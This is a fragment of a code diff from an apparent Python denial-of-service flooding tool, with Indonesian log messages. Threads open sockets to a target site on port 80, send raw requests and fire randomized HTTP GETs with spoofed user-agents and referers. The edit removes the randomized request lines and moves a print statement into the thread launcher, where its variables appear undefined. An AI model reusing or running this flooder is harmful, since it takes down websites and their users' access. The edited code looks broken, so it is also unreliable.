@@ -84,11 +84,7 @@ class MyThread(Thread,):
             try:
                 s.connect((server, 80))
                 s.send(request)
-                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
-                randomized_url = url + "?" + genstr(random.randint(3, 10))
-                requests.get(randomized_url, headers=headers)
-                u += 1
-                print("\033[92m[\033[97m+\033[92m]\033[92mNOZZ: " +str(u)+ " \033[96mMENGIRIMKAN PAKET ke" +str()+ " \033[97m" +url+ "\033[0m" )
+                
     
                 for c in newrequest:
                     sys.stdout.write( s.send(c).__str__() )
@@ -106,7 +102,7 @@ def da_delegator(SITE,DOS_TYPE):
     threads = []
     for num in range(thread_count):
         thr1=MyThread(SITE,DOS_TYPE)
-        print ('start - %s' % thr1)
+        print("\033[92m[\033[97m+\033[92m]\033[92mNOZZ: " +str(u)+ " \033[96mMENGIRIMKAN PAKET ke" +str()+ " \033[97m" +url+ "\033[0m" )
         thr1.start()
         threads.append(thr1)
         #thr1.join()
